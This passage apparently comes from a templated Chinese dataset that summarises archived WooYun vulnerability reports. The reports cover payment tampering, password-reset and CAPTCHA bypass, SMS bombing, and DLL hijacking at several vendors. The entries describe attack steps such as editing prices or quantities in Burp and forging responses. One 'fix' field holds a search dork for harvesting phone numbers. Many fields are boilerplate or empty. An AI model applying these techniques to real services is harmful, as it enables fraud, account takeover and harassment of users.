
**修复**: 加载OLE对象的控件的方式有问题,导致还有很多类似的问题存在!对加载控件判断.此测试代码在word 2013上不会崩溃,参考微软做法.
---

---
### [wooyun-2012-04821] 好友手机隐身可被检测
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 添加群成员，灰色头像表示隐身。添加成员手机隐身在线，直接被加入群中

**POC**: 手机隐身在线，直接被加入到群中

**绕过**: 直接利用

**修复**: 等待厂商解决
---

---
### [wooyun-2015-0160638] 365大学网设计逻辑缺陷可注册任意管理员账户(涉及22万学生用户)
**厂商**: 365大学网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先配置好burpsuite，然后来到用户注册处然后点击注册，抓包将dignity后面的参数7改为1然后提交显示注册成功，然后到邮箱里点击链接确认一下现在登录账户可以发现已经是管理员账户了

**POC**: 可发现是超级管理员权限涉及22万条学生的账户资料

**绕过**: 直接利用

**修复**: 去掉不合理参数
---

---
### [wooyun-2015-0147185] 91导学网设计逻辑缺陷任意重置密码漏洞
**厂商**: 91导学网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站的验证没弄好，可以直接跳过找回密码的第一步，直接修改密码，并且少了验证网站地址：http://**.**.**.**/index.php/Common/login

**POC**: 接着输入密码抓个包如图最后在邮箱处填写任意邮箱即可

**绕过**: 直接利用

**修复**: 添加验证
---

---
### [wooyun-2014-089509] 某手机厂商在线支付维修费用存在逻辑漏洞
**厂商**: 某手机厂商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无奈上BURP，590参数修改为10右下角在线支付：BURP抓包，修改参数，590修改为10（多少都可以）：然后直接付款：

**POC**: 右下角在线支付：BURP抓包，修改参数，590修改为10（多少都可以）：然后直接付款：

**绕过**: 直接利用

**修复**: 你们懂得 ~这是不是17.10？缓存不能清除~oh no！预测又是忽略~~~
---

---
### [wooyun-2015-0155878] 想去网支付逻辑漏洞
**厂商**: 想去 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0106468] H3C某系统找回密码逻辑漏洞
**厂商**: H3C技术论坛 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刚在看漏洞，然后看到了如下的一个漏洞WooYun: 华三某系同弱口令导致泄露大量信息就去看看是不是已经修了，看了下果然修了，然后在仔细一看发现有个找回密码https://example.com/[已脱敏]

**POC**: 再给一个信息泄漏的好多JAVA工程师阿

**绕过**: 直接利用

**修复**: 莫要忽略了，在忽略没人给你提交了
---

---
### [wooyun-2015-0110765] 爱征婚支付漏洞（史上最奇葩支付漏洞）
**厂商**: aizhenghun.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 主要美女太多了，哎。没办法先给大家看下美女吧，放松放松找不到厂商 找某互联网公司去好了，太奇葩了， 价钱完全你说了算。 你就是开发人员3个你选择开哪个？ 还用问吗，肯定是最贵的，完全就是在坑， 3个月7999元， 我工资都没那么高

**POC**: 重点来了 7999元然后，我了个去， 居然可以随便改价格，最低改1元，改0.9以下会出错有没有搞错哦， 价钱都可以随便改，一夜暴富， 可以卖小学生了

**绕过**: 直接利用

**修复**: 这种是最低级还低级的错误没支付，要是我1元支付7999元， 我是不是要蹲监狱求个礼物，
---

---
### [wooyun-2015-0102445] 东方有线支付逻辑漏洞
**厂商**: 东方有线 | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先打开https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 恩……自己看着办吧……
---

---
### [wooyun-2015-0131428] 沃的城市生活IOS逻辑漏洞导致用户名密码泄露可登录任意账号
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、查询任意人账号和密码1、任意注册一个账号，登录查询积分GET /client/woCityUserLogin.do?act=getUser&client=iphone&userMobile=18523002401 HTTP/1.1Host: wo.cq3g.cn:8383Accept-Encoding: gzipUser-Agent: æ²çåå¸çæ´» 1.0.7 (iPhone; iPhone OS 8.3; zh_CN)Connection: closeProxy-Connection: keep-alive2、数据抓包回放，发现6位数字密码md5值，6位数字md5值可轻易破解3、构造数据遍历账号和密码二、密码重置逻辑设计问题，可重置登录任意号码1、点击重置密码2、重置后的新密码返回在数据回包中

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、加强密码复杂度要求，防止md5被破解2、重置密码后，新密码不应返回在数据包中。
---

---
### [wooyun-2013-036787] 某视频网站商城支付逻辑漏洞（价格可更改）
**厂商**: 某视频网站网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、下单后选择支付2、查看链接发现价格直接明文显示在URL中https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 1、敏感参数不要明文放在URL中2、服务端效验
---

---
### [wooyun-2015-0114341] 某品牌手机对包名处理不当，导致无法卸载
**厂商**: 某品牌手机 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天某品牌手机装了一个有意思的软件，最后发现卸载不掉，研究了一下是什么情况

**POC**: 1. 手机未root2. 手机型号：3. 病毒软件https://example.com/[已脱敏] 使用系统自带的卸载和使用pm uninstall 卸载均报错，导致无法卸载。5. 错误原因：对包名的长度做判断，包名太长后，抛异常，导致无法卸载。（此病毒包名：jbkadedgiogedd.dooambofdmkjac.ceggghopiaeapo.bkilacoomapmlg.ajlipbomjikchn.gffijhogcffjmn.laoojnpfbebbha）影响：某品牌手机的这个漏洞，导致在非root手机上没有任何办法可以卸载掉包名过长的app。不确定是否是某手机厂商

**绕过**: 直接利用

**修复**: 出升级包
---

---
### [wooyun-2015-0161722] 猫色商城系统设计缺陷导致支付漏洞（只需邮费购买任意物品）
**厂商**: 猫色商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、注册一账号1@某域名.com,登录界面不存在登录验证码和登录错误次数限制，目测可暴力破解，未去尝试2、好吧，这么多东西，就买一款诱惑香水吧，不知道能不能让女人发狂，有木有艳遇，什么叫吸引女人信息素的香水，尼玛，明明是性激素吧，小编，能不能专业点3、立即购买，截取数据包，把数量改为-14、提交订单，此时只需要支付19元邮费，价格不够包邮的、5、选择在线某电商平台支付此时便产生了订单6、还可以选择货到付款订单提交成功了,就看发不发货了。

**POC**: 如上

**绕过**: 直接利用

**修复**: 修复支付逻辑
---

---
### [wooyun-2015-0108939] 朝暮数据支付漏洞
**厂商**: zhaomu.com | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先  先把东西加入购物车然后去付款此处抓包走起某电商平台还剩下3块钱  认同割爱的支付了看到这一幕  眼泪哗哗直下   正当我以为没有支付漏洞时我点击了一下空间管理突然感觉世界慢慢的 都是爱还有  这个  本来想测试一下有没有漏洞  的  不过暂时还没发现

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-098762] 某运营商某分公司云计算中心支付逻辑漏洞
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 原件1210的东西，现在只需要280

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2015-0161355] 某互联网公司讨论组某互联网公司转某互联网公司群无需确认可被用来推送广告
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06552] 关于某互联网公司科技手机令牌的时间的相关漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不知道在场的各位有没有使用过某互联网公司手机令牌，但是据本人分析，若将一个未来的时间调整到手机令牌上，手机就会出现一个未来的令牌号码，若不法分子收集了足够的某互联网公司令牌的未来密码，就所以让用户失去某互联网公司账号的控制权，给各位用户带来很大的麻烦，虽然在独立的手机令牌程序中有启动密码，但是手机某互联网公司内置的手机令牌和手机管家中内置的手机令牌且无此功能，望某互联网公司改正！

**POC**: 亲可以自己试试

**绕过**: 直接利用

**修复**: 增加全面的手机令牌的代码，并且不定期的更新手机令牌的时间随机列表，更好的就是可以让用户来随机更换手机令牌的加密算法或者在手机上手动调整某互联网公司令牌的时间的时候需要通过第二代加密认证，可有效处理此类办法
---

---
### [wooyun-2015-0100022] 某电商平台金融android app Activity组件暴露
**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Activity接口可被其它应用调用，用于执行特定的敏感操作或钓鱼欺骗，建议添加 android:exported="false"，若需要外部调用，需自定义signature或者signatureOrSystem级别的权限暴露的组建为com.jd.jrapp.ver2.frame.finance.FinanceSearchActivity

**POC**: 组件被调用

**绕过**: 直接利用

**修复**: 建议添加 android:exported="false"，若需要外部调用，需自定义signature或者signatureOrSystem级别的权限
---

---
### [wooyun-2015-0126963] 购酒网存在逻辑缺陷
**厂商**: 购酒网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购物车内商品数量可修改为负数，且可提交订单抓包修改数量刷新页面提交订单结果实际结果加上了运费

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-014750] 某IM软件短信轰炸
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某IM软件手机注册zc.某域名.com/chs/index.html先把信息填好，然后点击立即注册发送验证码时候虽然页面提示要30秒，但是用工具抓包，然后repeat一下，可以无限发，而且手机号码也可以修改为别的，用来做轰炸器不错

**POC**: 如上

**绕过**: 直接利用

**修复**: 好好做个验证吧！
---

---
### [wooyun-2013-036662] 迅雷看看多处DLL劫持
**厂商**: 迅雷 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 迅雷看看运行时会加载多个不存在的DLL文件目前发现6处DLL劫持。测试时默认安装目录为C:\Program Files\Thunder Network\Xmp\Program\迅雷看看主程序XMP.exe运行前会加载如下六处不存在的DLL文件XMP.exe运行前先加载下面两处不存在的DLLC:\Program Files\Thunder Network\Xmp\Program\streami.cfgC:\Program Files\Thunder Network\Xmp\Program\streami.datXMP.exe随便播放一集在线电视剧时再会加载如下四处不存在的DLLC:\Program Files\Thunder Network\Xmp\Program\ieframe.dllC:\Program Files\Thunder Network\Xmp\Program\dwmapi.d

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2013-038415] 酷狗音乐盒最新版dll劫持漏洞
**厂商**: 酷狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本：工具检测结果：

**POC**: 写一个伪造的DLL放入酷狗音乐盒目录：运行酷狗：伪造DLL中代码执行

**绕过**: 直接利用

**修复**: 不存在的DLL加载它作甚
---

---
### [wooyun-2012-012542] 鲜果网支付漏洞
**厂商**: 鲜果网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 没有一毛这个选项哈=-=！

**绕过**: 直接利用

**修复**: 二次验证金额，金额number不要赤果果传递如果你们要人工验证也可以，不过显得不高端呀
---

---
### [wooyun-2013-035469] 迅雷最新版DLL劫持漏洞
**厂商**: 迅雷 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 迅雷Thunder（版本7,9,8,4550），安装程序为官网Thunder_dl_7.9.8.4550.zip，windows xp sp3环境，Thunder运行时会试图加载一个不带路径的dl_peer_id.dll文件，如果在种子文件目录下放置一个恶意的dl_peer_id.dll文件，当用户双击打开该种子文件(.torrent)时，恶意DLL即被加载触发，危害性不用说了吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 带全路径加载。
---

---
### [wooyun-2014-088446] 某互联网公司手机某互联网公司安卓版本在低于4.4.2以下存在跨域漏洞问题
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们来回顾下这个漏洞WooYun: 三星手机自带浏览器跨域脚本执行漏洞然而。。没什么好说的。POC在测试代码上

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 安卓基层问题
---

---
### [wooyun-2012-06589] 又拍网旗下某站存在严重支付漏洞
**厂商**: 杭州纬聚网络有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 又拍网旗下又拍图片管家v.yupoo.com在对支付进行处理时，未使用SSL安全连接，也没有对购买时间进行限制。导致当购买时间为负数时，不但不会从帐户中扣除相应的金额，反而还会对帐户进行充值。

**POC**: 这里以续费VIP服务为例，其他支付服务麻烦厂商自检。====================================================选定续费的时候后，点击提交，使用Fiddler拦截发送的数据我们可以看到，其中的renewals_period中包括了我们续费的时间，我们将其修改为负数,RUN然后发现，神奇的事情来了。总共: ¥-15,840.00。确定支付！然后会返回首页~使用期限： 2012-05-02 至 1923-05-02 (有功能的，VIP功能可用)您的账户余额: ￥16,020.00 (原先有180)

**绕过**: 直接利用

**修复**: 使用SSL进行对支付页面的加密限制购买时间的大小，设定最小值和最大值
---

---
### [wooyun-2015-0164037] 科贝尔商城设计逻辑缺陷可任意手机号注册/重置任意账号密码（土豪账号演示）
**厂商**: 苏州科贝尔智能技术有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、进行重置密码操作，提交任意短信码（1234）2、短信码校验返回的响应包如下3、修改步骤2中响应包内容为：true4、成功进入设置新密码页面5、重置密码完成，已成功登录土豪账号13888888888

**POC**: 1、使用土豪手机号（13888888888）进行注册操作，提交任意短信码（1234）2、返回响应包如下3、修改响应包结果为true，可成功完成注册4、已成功注册土豪账号

**绕过**: 直接利用

**修复**: 完善校验逻辑对于多步骤操作，前一步完成后需生成一个标识参数带到下一步校验
---

---
### [wooyun-2015-099933] 某品牌手机的短信找回功能存在重放攻击风险
**厂商**: 某手机厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 综述：访问某手机厂商的手机找回官网https://example.com/[已脱敏] 可以发起手机找回功能的请求。该功能和手机配合的时候，默认是通过网络信道（如WiFi，3G，4G等）进行请求/响应。但是，如果将网络信道关闭，则只能通过某手机厂商的短信网关进行手机找回功能的操作。我发现某手机厂商没有对短信的请求命令来源做检查，于是有了如下报告。攻击方式：将网络信道完全关闭，如数据通道、WiFi关闭。1、假设某品牌手机的账号是18512345678，使用该手机账户登陆https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08563] 无意中发现的某电商平台信用卡充值，余额可提现
**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 环境：iPhone银行：某银行晚上无聊用手机看某电商平台，随手买了件衣服，付款完成后回到“我的某电商平台”，发现商品还是未付款，正纳闷呢，再次点付款，之后发现了原来那款项在“余额”那，看图吧

**POC**: 余额里39呢，把余额的勾勾去掉，选择其他付款方式，再复现一遍。手机银行-某股份制银行收到短信，打开链接，弹出浏览器支付完毕，看余额pc上看看

**绕过**: 直接利用

**修复**: 小瑕疵而已亲
---

---
### [wooyun-2013-026219] 财付通商户版登录验证码绕过
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 财付通商户版登录的时候 多次登录失败 之后出现验证码 但是验证码可秒绕过 完全没用多次登录 密码错误之后出现验证码看链接https://example.com/[已脱敏] /?verify_code=1  就可以绕过属于验证码设计缺陷

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的
---

---
### [wooyun-2013-020460] Phpcms v9 验证码绕过漏洞(应该属于验证机制问题)
**厂商**: phpcms | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.打开 https://example.com/[已脱敏])https://example.com/[已脱敏])https://example.com/[已脱敏] 请求包4.发送后会返回用户不存在5.利用同样的数据包再次发送仍会提示用户不存在(注意两次用的是一个同一个验证码)

**POC**: 详细说明中已经说了.利用这一过程可以进行fuzz

**绕过**: 直接利用

**修复**: 重新考虑下验证码机制
---

---
### [wooyun-2014-083207] 长风网络支付逻辑漏洞免费购买虚拟主机
**厂商**: 长风网络 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台上找了个虚拟主机供应商，长风网络，https://example.com/[已脱敏]

**POC**: 首先注册一个帐号，登录后的个人界面如下：可以看到有虚拟主机能够购买，选一款主机购买启动burpsuite截获数据包将购买buymod改为-1，程序未进行逻辑验证提交引发出错，此时点go，可以看到主机价格变为0，如图示点击确认开通在主机管理页面了可以看到主机已经开通

**绕过**: 直接利用

**修复**: 逻辑错误，对输入项进行验证
---

---
### [wooyun-2012-011627] 驴妈妈旅游网支付漏洞第二弹
**厂商**: 驴妈妈旅游网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次小一提交的是购买商品的支付漏洞，厂商回复有返回检查；姑且相信厂商吧，不过wooyun上有过乌龙的哦，待补款，但是发货了……这个支付漏洞，是积分商城的……1、积分商城的兑换的商品时，未对商品数量做检查……2、同时也没防篡改3、只检查了当前积分与兑换商品的积分，判断是否可兑换祭出调试工具：修改后的数据，主要修改用户积分，使得用户积分大于商品积分就可以继续兑换流程；同时修改了商品数量，改成负数了……兑换成功，积分长了~~~~厂商也许会说，会检查订单，不给发货；不过我测试了下，这个积分可以用来抽奖，兑换优惠券，反正可以用的……P.S. 上次你们管理离职，害我心灵受到无穷创伤T_T，必须补偿，驴妈妈，补偿个驴？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、检查商品数量是否为负数2、做好防篡改3、最好所有这些都在服务端进行~~别放在客户端
---

---
### [wooyun-2013-043564] 北京图书大厦自助查询终端设备沙盒破解进入系统
**厂商**: 北京图书大厦 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 和其他终端设备跳出一样，没什么技术含量！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2012-014777] 苏宁某银行分期付款信用卡支付漏洞
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 签名，加密，难道某银行没给文档吗？
---

---
### [wooyun-2013-038808] 聚美优品某处验证绕过可进行无限短信轰炸
**厂商**: 聚美优品 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，你得有个帐号在会员中心中绑定手机处，发送验证码到手机没有只是前端限制了时间，使用burp抓包重发就可以无限发送。这个接口速度不是很快，差不多3秒两条。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 发送短信验证码之前先让用户输入个验证码，或者最好后端限制一下发送频率或每个号码的次数
---

---
### [wooyun-2015-0148674] 某运营商网上营业厅逻辑漏洞可影响全用户详细个人信息/消费积分充话费/备份通讯录/绕过支付短信等（以某经纪人为例）
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某运营商网上营业厅客户端app客户端打开随便选择一个功能，选择登陆登陆的时候的包，放掉，抓返回的包。返回来的包，拦截掉，然后修改为b5720f816f50db5eb94116fd795b9f770f4af1f252692aa8c138f0e8150856db0b52b7c8000a7be699aabc4ab106f380f9e488a10e8269792beb5b46a667cdf32e20cf7649e74841dcfc49d871e100bda5b005efdca1abf6d8f95b802b6db01dc0bc44d9f75be7b899fcac6bf3674bff51429cb76f9ea218fa2bad0b88a6c6c80d9edbb96f284e26c08a514ffe89869973b1d297873df3042f7fed5cff21498279cee5c1521deab

**POC**: 登录以后访问积分商城的，发现会有这么一条数据get出去，里面是包含着身份证信息，和姓名的。还有其他一些不知道什么鬼的。点击配送地址，抓包，可以看到返回信息里还是包含机主的地址信息。可以使用积分兑换来给兑换话费或者充值卡，和任意登录同理，支付时候修改2次返回包，第一次返回包附上以上提到的代码，第二次奖其中的0002改为0000即可成功支付无需发送验证码短信，附上充值话费成功截图

**绕过**: 直接利用

**修复**: |构造关键字，谷歌搜索site:**.**.**.** intext:工作联系 133|189|153|180|181会发现不少明星或者经纪人会留下工作手机号，找到其中的电信号码，批量下载通讯录，相信整个娱乐圈的明星我都认识了。例子1:《爱的秘笈》某主演经纪人手机号毕竟是二三线明星，认识的大碗有限。
---

---
### [wooyun-2013-036694] PPTV网络电视客户端十处DLL劫持
**厂商**: PPTV(PPlive) | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时PPTV网络电视默认安装路径：C:\Program Files\PPLive\PPTV\具体利用方法：PPLive.exe运行时（包括播放视频时）会加载十个不存在的DLL文件分别为：C:\Program Files\PPLive\PPTV\[IP已脱敏]1\components\ppp.dllC:\Program Files\PPLive\PPTV\ieframe.dllC:\Program Files\PPLive\PPTV\vsfilter.langC:\Program Files\PPLive\PPTV\nvcuvid.dllC:\Program Files\PPLive\PPTV\openlc.dllC:\WINDOWS\system32\dwmapi.dllC:\Program Files\Common Files\PPLiveNetwork\[IP已脱敏]4\ke

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2013-022469] vpncup支付漏洞可免费使用vpn
**厂商**: cs368.cn | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过burp修改金额，达到免费用vpn的目的

**POC**: 选择800元的服务burp修改金额变0.1元

**绕过**: 直接利用

**修复**: 加验证
---

---
### [wooyun-2015-0114949] 某国有银行软键盘存在绕过风险
**厂商**: 某国有银行 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
